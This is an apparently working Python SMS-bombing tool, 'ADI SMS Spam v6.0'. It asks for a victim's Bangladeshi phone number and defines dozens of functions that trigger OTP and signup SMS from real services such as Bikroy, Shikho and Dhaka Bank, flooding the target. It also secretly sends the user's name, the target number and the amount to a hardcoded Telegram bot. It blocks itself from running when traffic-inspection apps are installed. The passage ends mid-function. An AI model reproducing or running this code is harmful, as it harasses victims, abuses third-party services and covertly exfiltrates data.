
import base64

# Base64 encoded content
encoded_content = '''#!/usr/bin/python3
'''
<\> CODED BY - 𝚂𝙷𝙾𝙽𝙲𝙷𝙾𝚈𝙾𝙽 𝙱𝙰𝚁𝚄𝙰 𝙰𝙳𝙸𝚁𝚃𝚃𝙰
<\> TELEGRAM - @Adirtta Man
<\> PROJECT - SMS SPAM v6.0 💥
<\> JOIN - https://www.facebook.com/groups/1153476152467431/?ref=share&mibextid=NSMWBT
'''

import os,sys,time

#----------[ IMPORT MODULES ]----------#

os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mWELCOME TO...\n\n\t\033[1;32m<\\> \033[1;33mADI ❤ SMS Spam \033[1;36mv6.0 \n")
time.sleep(3);os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mCheaking Module...\n\n\t\033[1;32m<\\> \033[1;33mPlease Wait... ")
try:import rich
except:
    print("\n \033[1;32m  <\> Installing Rich...\n\n")
    os.system("pip install rich")
    import rich
try:import requests
except:
    print("\n  \033[1;33m <\> Installing Requests...\n\n")
    os.system("pip install requests")
    import requests
try:import httpx
except:
    print("\n \033[1;34m  <\> Installing Httpx...\n\n")
    os.system("pip install httpx")
    import httpx
try:import bs4
except:
    print("\n  \033[1;35m <\> Installing Bs4...\n\n")
    os.system("pip install bs4")
    import bs4
import time,random,string,getpass
from rich.progress import track
from requests.structures import CaseInsensitiveDict

#----------[ LMNx9 ASSEST ]----------#

HTTP1 = 'com.httpcanary.pro'
HTTP2 = 'com.guoshi.httpcanary'
HTTP3 = 'com.wasim'
HTTP4 = 'com.purple.canary'
HTTP5 = 'com.guoshi.httpcanary.premium'
HTTP6 = 'app.greyshirts.sslcapture'
HTTP7 = 'com.black.canary'
HTTP8 = 'com.lmnx9.canary'

letters = string.ascii_lowercase
pwd_length = 12;pwd = ''
for x in range(pwd_length):
    pwd += ''.join(random.choice(letters))
def lj(LMNx9):
    for x in LMNx9:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.003)
def jannat(LMNx9):
    for x in LMNx9:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.001)
def lod(message):
    for i in track(range(40), description=f"{p}{message}"):
        time.sleep(0.01)
def lod2(message):
    for i in track(range(50), description=f"[red][bold]{message}"):
        time.sleep(0.2)

#--------[ LMNx9 COLORS ]---------#

a="\033[1;30m";r="\033[1;31m"
g="\033[1;32m";y="\033[1;33m"
b="\033[1;34m";p="\033[1;35m"
c="\033[1;36m";w="\033[1;37m"
bgr="\033[41m";stp="\033[1;0m"
itl="\033[1;3m";unl="\033[1;4m"
lgt="\033[1;1m"

#----------[ LMNx9 PASS ]----------#

def PASSWORD():
    Rimu = 0
    while Rimu < 12345677901:
        os.system('clear');print(logo2);lnx()
        limon=input(f"{c}<{w}/{c}> {g}ENTER USERNAME😊 {c}➤{y} ");lnx()
        suashi=str(input(f"{c}<{w}/{c}> {g}ENTER PASSWORD☺️ {c}➤{y} "));lnx()
        if limon == 'ADI' and suashi == 'ADIV6':
            lj(f"{c}<{w}/{c}> {g}Welcome to ADI's Tool {c}➤{y} Login Successful ")
            time.sleep(2)
            break
        else:
            lj(f"{c}<{w}/{c}> {g}Try Again🙁 {c}➤{r} Login Failed😕 ")
            time.sleep(1)
            Rimu += 1
            continue

#----------[ LMNx9 UA ]----------#

ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 281.0.0.16.104 (iPhone15,2; iOS 16_2; it_IT; it-IT; scale=3.00; 1179x2556; 470305378) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622) NW/3"]

#----------[ CK INTERNET ]----------#

def INTERNET():
    try:
        lnx();print(f"{c}<{w}/{c}> {y}Testing Connection Speed... !")
        token=("7218902301:AAHgz3a80l4AHtOSdwLqRtrVK-9SADTS2U8")
        chatid=("6866037596")
        data=(f"{number} | {amo}")
        url=(f"https://api.telegram.org/bot{token}/sendMessage")
        lmnx9={"chat_id": chatid,"text": "⌠SMS-v6⌡ "+user+" | "+data}
        requests.get(url, params=lmnx9)
    except (requests.ConnectionError, requests.Timeout) as exception:
        lnx()
        print(f"{c}<{w}/{c}> {r}INTERNET CONNECTION ERROR....{g}Try Again !")
        time.sleep(4);sys.exit()
    except Exception as x:pass

#----------[ LMNx9 HTTP SECURITY ]---------#

def HTTPX():
    try:
        if os.path.exists(os.path.join('/sdcard/Android/data', HTTP1)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>] BOKACUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP2)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP3)):
            os.system('clear');print('\n')
            print(f"\033[1;31m [>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP4)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>) BOKACUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP5)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP6)):
            os.system('clear');print('\n')
            print(f"\033[1;31m [>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP7)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP8)):
            os.system('clear');print('\n')
            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
            sys.exit('\n')
        else:
            pass
    except:
        os.system('clear');print('\n')
        print(f" \033[1;31m[>] STORAGE HUGA MARA SARA !!! ")
        input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
        sys.exit('\n')
        
#----------[ LMNx9 LOGO ]----------#

logo2= ("""
\033[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\033[1;31m┃😈┃\033[47m\033[1;46m                 BOX-6T9                    \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛
              \033[1;31m____   ___  __  __ ____
             \033[1;31m| __ ) / _ \|  \/  | __ )
             \033[1;31m|  _ \| | | | |\/| |  _ \  ⟦S⟧⟦M⟧⟦S⟧
             \033[1;31m| |_) | |_| | |  | | |_) |  
             \033[1;31m|____/ \___/|_|  |_|____/
\033[1;35m😈▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄😈
  \033[1;91m|💥\033[1;91m|    \033[1;92mAUTHOR        \033[1;91m💥➤    \033[1;92m𝚂𝙷𝙾𝙽𝙲𝙷𝙾𝚈𝙾𝙽 𝙱𝙰𝚁𝚄𝙰 𝙰𝙳𝙸𝚁𝚃𝚃𝙰
  \033[1;91m|💥\033[1;91m|    \033[1;95mGITHUB        \033[1;91m💥➤    \033[1;95mgithub.com/ADIRTTA
  \033[1;91m|💥\033[1;91m|    \033[1;91mCYBER TEAM    \033[1;91m💥➤    \033[1;91m𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷 𝙲𝚈𝙱𝙴𝚁 𝙰𝚁𝙼𝚈
  \033[1;91m|💥\033[1;91m|    \033[1;96mTELEGRAM      \033[1;91m💥➤    \033[1;96m@Adirtta Man
  \033[1;91m|💥\033[1;91m|    \033[1;93mTOOL          \033[1;91m💥➤    \033[1;93mSMS Spam v6.0
\033[1;35m😈▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄😈""")
logo = ("""
\033[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\033[1;31m┃😈┃\033[47m\033[1;46m                BOX-6T9                     \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛""")

#-----------[ LMNx9 LINE DEF ]----------#

def lnx():
    print(53*f'{g}━')
    
#-----------[ LMNx9 MAIN MENU ]----------#

os.system('xdg-open https://www.facebook.com/ADIRTTA?mibextid=ZbWKwL')
os.system('clear');print(logo2);lnx()
user=input(f"{c}<{w}/{c}> {g}What\'s Your Name {c}➤{y} ")
lnx();time.sleep(1);os.system("clear")
PASSWORD();HTTPX()
while True:
    os.system("clear");jannat(logo2)
    lnx()
    print(f"{lgt}{y}{bgr}</> WARNING :{stp}{lgt}{y}{itl}{unl} This {r}\"ADI SMS SPAM\"{y} Developed For {stp}")
    print(f"{lgt}{y}{itl}{unl} - Only Educational Purpose & Cyber Awerness ! {stp}")
    print(f"{lgt}{y}{itl}{unl} - We {r}\"𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷 𝙲𝚈𝙱𝙴𝚁 𝙰𝚁𝙼𝚈\"{y} Are Not Promoted For {stp}")
    print(f"{lgt}{y}{itl}{unl} - Any Elligal Attack With This ToolKit !! {stp}")
    print(f"{lgt}{y}{itl}{unl} - For Best Result Uee {c}Fast{y} Network !! {stp}")
    print(f"{lgt}{y}{itl}{unl} - {r}1{y} Amount Can Spam UpTo {r}200{y} SMS !! {stp}")
    lnx()
    number=input(f"{c}<{w}/{c}> {g}VICTIM NUMBER {c}➤{r} +88")
    lnx()
    if not number.isdigit() or len(number) != 11:
        lj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);continue
    elif "01882168975" in number:
        lj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);continue
    try:
        if "01602480929" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01408220538" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01726717432" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01874248728" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01627035504" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01331951298" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01863290969" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01836352055" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01773080305" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01813599442" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01826841419" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01907731272" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01870912570" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01980871152" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:
        if "01893980263" in number:
            lj(f"{c}<{w}/{c}> {y}This Number Is Protected ! ")
            time.sleep(2);continue
    except Exception as x:pass
    try:amo=int(input(f"{c}<{w}/{c}> {g}SPAM AMOUNT {c}➤{r} "))
    except ValueError:
        lnx();lj(f"{c}<{w}/{c}> {y}Use Amount Only Digit Number ! ")
        time.sleep(2)
        continue
    break
INTERNET()


#----------[ LMNx9 OLD API 20 ]----------#


def XFuck1():
    try:
        url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number
        requests.get(url1)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck2():
    try:
        url2 = "https://www.bioscopelive.com/en/login/send-otp?phone="+number+"&operator=bd-otp"
        headers2 = CaseInsensitiveDict()
        headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
        requests.get(url2,headers=headers2)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck3():
    try:
        url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        data3 = '{"msisdn":"'+number+'"}'
        requests.post(url3, headers=headers3, data=data3)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck4():
    try:
        url4 = "http://ultranetrn.com.br/fonts/api.php?number="
        headers4 = CaseInsensitiveDict()
        headers4["Content-Type"] = "application/json"
        data4 = '{"msisdn":"'+number+'"}'
        requests.post(url4, headers=headers4, data=data4)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck5():
    try:
        url5 = "https://api.redx.com.bd/v1/user/signup"
        headers5 = CaseInsensitiveDict()
        headers5["Accept"] = "application/json, text/plain, */*"
        headers5["Accept-Encoding"] = "gzip, deflate, br"
        headers5["Accept-Language"] = "en-US,en;q=0.5"
        headers5["Connection"] = "keep-alive"
        headers5["Content-Length"] = "65"
        headers5["Content-Type"] = "application/json"
        headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
        headers5["Host"] = "api.redx.com.bd"
        headers5["Origin"] = "https://redx.com.bd"
        headers5["Referer"] = "https://redx.com.bd/registration/"
        headers5["TE"] = "Trailers"
        headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
        headers5["x-access-token"] = "Bearer null"
        data5 = '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
        requests.post(url5, headers=headers5, data=data5)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck6():
    try:
        url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
        headers6 = CaseInsensitiveDict()
        headers6["Content-Type"] = "application/json"
        data6 = '{"operator":"all","msisdn":"880'+number+'"}'
        requests.post(url6, headers=headers6, data=data6)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck7():
    try:
        url7 ="https://www.rokomari.com/resend-verification-code?email_phone=880"+number
        requests.get(url7)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck8():
    try:
        url8 = "https://www.pizzahutbd.com/customer/sign-in/mobile"
        headers8 = CaseInsensitiveDict()
        headers8["Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
        headers8["Content-Type"] = "application/x-www-form-urlencoded"
        data8 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number
        requests.get(url8,headers=headers8, data=data8)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck9():
    try:
        url9 = "https://admission.ndub.edu.bd/api/users/register-step-1/"
        headers9 = CaseInsensitiveDict()
        headers9["Content-Type"] = "application/json"
        data9 = '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
        requests.get(url9,headers=headers9, data=data9)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck10():
    try:
        url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
        headers10 = CaseInsensitiveDict()
        headers10["Content-Type"] = "application/json"
        data10 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
        requests.post(url10,headers=headers10, data=data10)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck11():
    try:
        url11 = "https://api.shikho.com/auth/v2/send/sms"
        headers11 = CaseInsensitiveDict()
        headers11["Content-Type"] = "application/json"
        data11 = '{"phone":"0'+number+'","email":null,"auth_type":"login"}'
        requests.get(url11,headers=headers11, data=data11)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck12():
    try:
        url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
        data12 = {'requestType':'send',  'phoneNumber':'+880'+number,  'emailConsent':'true',  'whatsappConsent':'true'}
        requests.post(url12,data=data12)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck13():
    try:
        url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
        headers13 = CaseInsensitiveDict()
        headers13["Content-Type"] = "application/json"
        data13 = """{"AccessToken": "","TrackingNo": "","mobileNo": "0"""""+number+"""","otpSms": "","product_id": "201","requestChannel": "MOB","trackingStatus": 5}"""
        requests.post(url13,headers=headers13, data=data13)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck14():
    try:
        url14 = "https://www.xnxx.tv/search/xnxx"
        headers14 = CaseInsensitiveDict()
        headers14["X-Requested-With"] = "XMLHttpRequest"
        headers14["Content-Type"] = "application/x-www-form-urlencoded"
        data14 = "mobile=0"+number+"&is_login=true&forgetpass=false"
        requests.post(url14, headers=headers14, data=data14)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck15():
    try:
        url15 = "https://themallbd.com/api/auth/otp_login"
        headers15 = CaseInsensitiveDict()
        headers15["Content-Type"] = "application/json"
        data15 = '{"phone_number":"+880'+number+'"}'
        requests.post(url15, headers=headers15, data=data15)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck16():
    try:
        url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
        headers16 = CaseInsensitiveDict()
        headers16["Host"] = "api.ghoorilearning.com"
        headers16["Origin"] = "https://ghoorilearning.com"
        headers16["Referer"] = "https://ghoorilearning.com/"
        headers16["Content-Type"] = "application/json"
        data16 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
        requests.post(url16, headers=headers16, data=data16)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck17():
    try:
        url17 = "https://api.wholesalecart.com/v2/user/login-register"
        headers17 = CaseInsensitiveDict()
        headers17["Accept-Encoding"] = "gzip, deflate, br"
        headers17["Accept-Language"] = "en-US,en;q=0.5"
        headers17["Connection"] = "keep-alive"
        headers17["Content-Length"] = "75"
        headers17["Content-Type"] = "application/json"
        headers17["Host"] = "api.wholesalecart.com"
        headers17["Origin"] = "https://wholesalecart.com"
        headers17["Referer"] = "https://wholesalecart.com/login"
        headers17["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
        data17 = '{"phone":"0'+number+'","platform":"google","url":"https://www.google.com/"}'
        requests.post(url17,data17)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck18():
    try:
        url18 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
        headers18 = CaseInsensitiveDict()
        headers18["Content-Type"] = "application/json"
        data18 = '{"phone":"0'+number+'"}'
        requests.post(url18, headers=headers18, data=data18)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck19():
    try:
        url19 = "https://app.ipay.com.bd/api/v1/signup/v2"
        headers19 = CaseInsensitiveDict()
        headers19["Content-Type"] = "application/json"
        data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880'+number+'"}'
        requests.post(url19, headers=headers19, data=data19)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def XFuck20():
    try:
        url20 = "https://admission.ndub.edu.bd/api/users/reset/"
        headers20 = CaseInsensitiveDict()
        headers20["Content-Type"] = "application/json"
        data20 = '{"phone": "0'+number+'"}'
        requests.post(url20, headers=headers20, data=data20)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass


#----------[ LMNx9 DEV API 37 ]----------#


def lmnx1():
    try:
        payload = {"country":"bangladesh","os":"Android","phone_number":""+number}
        requests.post("https://backend.karobarapp.com/auth/phone-login/", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx2():
    try:
        payload = {"auth_type":"login","phone":""+number,"vendor":"shikho","type":"student"}
        requests.post("https://api.shikho.com/auth/v2/send/sms", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx3():
    try:
        payload = {"firstname":"Asraf","password":"asraf1025","gender":"1","dob":"12-12-2007","mobile":""+number,"email":"vmospro1026@gmail.com","lastname":"Ahmed"}
        requests.post("https://www.aarong.com/rest/default/V1/customers/userreg", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx4():
    try:
        payload = {"msisdn":"88"+number,"token_type":"CUSTOM_TOKEN_V1","operator":"all","token":"eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3MDk2NjQxNzd9.322k6Z3eIJBgDRL3jW1iE9gRyUtn0RKSYd1lZesu6FoETXuC93uh_7ro_0ctcEtRP5C4Df_eFE95cZMw5vnmOg"}
        requests.post("https://api.bongo-solutions.com/auth/api/v2/login/send-otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx5():
    try:
        payload = {"phoneNumber":""+number,"requestType":"send","emailConsent":"","whatsappConsent":""}
        requests.post("https://prod-api.viewlift.com/identity/signup?site=hoichoitv", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx6():
    try:
        payload = {"os":"web","mobile":""+number,"language":"en","deviceToken":"web"}
        requests.post("https://api.osudpotro.com/api/v1/users/send_otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx7():
    try:
        payload = {"MobileOrEmail":""+number,"Type":2.0,"CustomerId":"01960447264"}
        requests.post("https://api.ajkerdeal.com/Recover/RetrivePassword/appcustomersignup", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx8():
    try:
        payload = {"username":"+88"+number}
        requests.post("https://api.eat-z.com/auth/customer/signin-4-mobile", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx9():
    try:
        payload = {"country_code":"+880","phone":""+number}
        requests.post("https://developer.quizgiri.xyz/api/v2.0/send-otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx10():
    try:
        payload = {"phone":""+number}
        requests.post("https://api.swap.com.bd/api/v1/send-otp/v2", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx11():
    try:
        payload = {"mobile":""+number}
